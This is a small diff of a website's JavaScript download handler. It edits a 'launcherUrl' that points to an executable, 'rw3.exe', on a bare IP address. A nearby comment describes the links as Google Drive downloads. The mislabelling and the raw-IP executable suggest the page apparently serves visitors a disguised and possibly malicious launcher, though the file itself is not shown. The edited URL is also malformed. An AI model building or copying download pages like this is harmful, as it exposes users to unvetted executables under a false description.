@@ -251,7 +251,7 @@ document.addEventListener('DOMContentLoaded', () => {
     const confirmFullVersionBtn = document.getElementById('confirmFullVersionBtn');
 
     // URLs for downloads (Google Drive links)
-    const launcherUrl = '18.232.68.216/rw3.exe';
+    const launcherUrl = 'http:/18.232.68.216/rw3.exe';
     const fullVersionUrl = 'https://drive.google.com/drive/folders/1VQrQQyfAvUEyaseRcxL0cC56gc3i0Wuf?usp=sharing';
 
     // Close buttons
@@ -325,4 +325,5 @@ document.addEventListener('DOMContentLoaded', () => {
     });
 
 }); 
+
 
